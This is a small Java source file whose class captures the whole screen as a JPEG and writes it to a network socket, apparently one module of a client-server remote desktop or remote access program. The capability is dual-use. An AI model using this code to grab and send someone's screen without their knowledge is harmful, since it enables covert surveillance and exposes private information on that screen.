package client;
import java.awt.*;
import java.awt.image.*;
import javax.imageio.ImageIO;
import java.io.*;
import java.net.*;

public class ScreenCapture {
    public static void capture(Socket socket) {
        try {
            Robot robot = new Robot();
            Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage image = robot.createScreenCapture(screen);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", baos);
            OutputStream out = socket.getOutputStream();
            out.write(baos.toByteArray());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
